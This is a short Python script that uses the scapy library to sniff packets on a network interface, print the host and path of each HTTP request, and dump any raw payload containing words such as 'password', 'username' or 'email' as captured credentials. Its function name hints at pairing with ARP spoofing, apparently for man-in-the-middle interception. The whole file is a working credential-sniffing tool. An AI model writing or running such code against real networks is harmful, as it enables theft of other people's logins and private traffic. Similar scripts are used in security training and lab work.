import scapy.all as scapy
from scapy.layers import http

def print_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("link >>> ", url)
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["email", "username", "password", "login", "user"]
            for key in keywords:
                if key in load:
                    print("cred >>> ", load)

def sniff_arp(interface):
    scapy.sniff(iface=interface, store=False, prn=print_sniffed_packets)
